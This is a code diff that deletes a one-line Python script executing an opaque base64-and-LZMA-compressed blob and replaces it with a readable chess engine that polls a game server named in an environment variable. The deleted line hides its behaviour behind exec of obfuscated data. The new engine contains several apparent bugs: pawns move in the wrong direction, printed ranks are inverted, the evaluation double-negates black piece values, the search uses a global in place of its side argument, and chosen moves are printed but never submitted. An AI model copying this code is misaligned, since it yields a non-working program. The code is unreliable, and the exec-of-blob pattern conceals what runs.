@@ -1,1 +1,151 @@
-import lzma,base64;exec(lzma.decompress(base64.b64decode("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")))
+import json,os,sys,urllib.request,urllib.error as U
+E=os.environ["MAKEFUN_ENV_URL"]
+H={"content-type":"application/json"}
+def R(p,b):
+ try:return json.load(urllib.request.urlopen(urllib.request.Request(E+p,data=json.dumps(b).encode(),headers=H)))
+ except U.HTTPError:sys.exit(0)
+M88=0x88
+A=[r*16+c for r in range(8) for c in range(8)]
+PW="PNBRQK";PB="pnbrqk"
+def pc(c):
+ i=PW.find(c);return i if i>=0 else PB.find(c)+6
+PP=PW+PB
+V=[100,320,330,500,900,0,-100,-320,-330,-500,-900,0]
+def lf(b,f):
+ for i in range(128):b[i]=" "
+ p=f.split();r=0;c=0
+ for h in p[0]:
+  if h=="/":r+=1;c=0;continue
+  if h.isdigit():c+=int(h)
+  else:b[r*16+c]=h;c+=1
+ t=p[1]=="w";C=0
+ for x in p[2]:
+  if x=="K":C|=1
+  elif x=="Q":C|=2
+  elif x=="k":C|=4
+  elif x=="q":C|=8
+ e=-1
+ if p[3]!="-":c="abcdefgh".index(p[3][0]);r=8-int(p[3][1]);e=r*16+c
+ return t,C,e
+def ka(s,b,w):
+ if w:
+  for d in(-1,1):
+   t=s-16+d
+   if(t&M88)==0 and b[t]=="P":return 1
+ else:
+  for d in(-1,1):
+   t=s+16+d
+   if(t&M88)==0 and b[t]=="p":return 1
+ for d in(33,31,-31,-33,18,14,-14,-18):
+  t=s+d
+  if(t&M88)==0:
+   if w and b[t]=="N":return 1
+   if not w and b[t]=="n":return 1
+ for d in(17,15,-15,-17,16,-16,1,-1):
+  t=s
+  while 1:
+   t+=d
+   if(t&M88)!=0:break
+   c=b[t]
+   if c==" ":continue
+   if w:
+    if c=="B" and d in(17,15,-15,-17) or c=="R" and d in(16,-16,1,-1) or c in"QK":return 1
+   else:
+    if c=="b" and d in(17,15,-15,-17) or c=="r" and d in(16,-16,1,-1) or c in"qk":return 1
+   break
+ return 0
+def gl(b,t,e):
+ mv=[]
+ for s in A:
+  p=b[s]
+  if p==" ":continue
+  if t and p in PB:continue
+  if not t and p in PW:continue
+  cc=pc(p)
+  if cc==5 or cc==11:
+   for d in(17,15,-15,-17,16,-16,1,-1):
+    x=s+d
+    if(x&M88)==0 and((b[x]==" ")or(t and b[x] in PB)or(not t and b[x] in PW))and not ka(x,b,t):mv.append((s,x,-1))
+   continue
+  if cc in(2,8):dl=(17,15,-15,-17)
+  elif cc in(3,9):dl=(16,-16,1,-1)
+  elif cc in(4,10):dl=(17,15,-15,-17,16,-16,1,-1)
+  else:dl=None
+  if dl:
+   for d in dl:
+    y=d
+    while 1:
+     x=s+y
+     if(x&M88)!=0:break
+     if b[x]!=" ":
+      if(t and b[x] in PB)or(not t and b[x] in PW):mv.append((s,x,-1))
+      break
+     else:mv.append((s,x,-1))
+     y+=d
+  elif cc in(1,7):
+   for n in(33,31,-31,-33,18,14,-14,-18):
+    x=s+n
+    if(x&M88)==0 and((b[x]==" ")or(t and b[x] in PB)or(not t and b[x] in PW)):mv.append((s,x,-1))
+  elif cc in(0,6):
+   f=16 if t else -16;s7=1 if t else 6
+   x=s+f
+   if(x&M88)==0 and b[x]==" ":
+    if(t and x>>4==7)or(not t and x>>4==0):mv.append((s,x,1))
+    else:mv.append((s,x,-1))
+    if s>>4==s7:
+     x2=s+2*f
+     if(x2&M88)==0 and b[x2]==" ":mv.append((s,x2,-1))
+   for d in(1,-1):
+    c=s+f+d
+    if(c&M88)==0:
+     if(t and b[c] in PB)or(not t and b[c] in PW):
+      if(t and c>>4==7)or(not t and c>>4==0):mv.append((s,c,1))
+      else:mv.append((s,c,-1))
+     elif c==e:mv.append((s,c,-1))
+ return mv
+def ev(b,t):
+ sc=0
+ for s in A:
+  p=b[s]
+  if p==" ":continue
+  cc=pc(p)
+  if cc<0:continue
+  sc+=V[cc] if cc<6 else -V[cc-6]
+ return sc if t else -sc
+def nm(b,st,t,d,a,b2):
+ if d<=0:return ev(b,t),None
+ mv=gl(b,turn,st[2])
+ if not mv:
+  k="K" if t else "k";km=-1
+  for s in A:
+   if b[s]==k:km=s;break
+  if km<0 or ka(km,b,t):return -100000+d,None
+  return 0,None
+ bm=None;bs=a
+ for m in mv:
+  s,x,pr=m
+  ob=list(b);ost=list(st)
+  b[x]=b[s];b[s]=" "
+  if pr>=0:b[x]=PP[pr]
+  k="K" if t else "k";ns=-1
+  for y in A:
+   if b[y]==k:ns=y;break
+  if ns<0 or ka(ns,b,t):b[:]=ob;st[:]=ost;continue
+  sc,_=nm(b,st,not t,d-1,-b2,-a)
+  b[:]=ob;st[:]=ost
+  if sc>bs:bs=sc;bm=m
+ return bs,bm
+while 1:
+ g=R("/game",{})
+ if g["status"]=="done":break
+ if g["status"]=="your_move":
+  b=[" "]*128;turn,C,e=lf(b,g["fen"]);st=[turn,C,e];bm=None
+  for d in range(1,4):
+   sc,bm2=nm(b,st,turn,d,-100000,100000)
+   if sc==-100000+d:continue
+   if bm2:bm=bm2;break
+  if bm is None:ms=gl(b,turn,e);bm=ms[0] if ms else None
+  if bm is None:print("e2e4")
+  else:
+   s,x,pr=bm;f="abcdefgh"
+   print(f[s%16]+str(s//16+1)+f[x%16]+str(x//16+1)+{1:"N",2:"B",3:"R",4:"Q"}.get(pr,""))
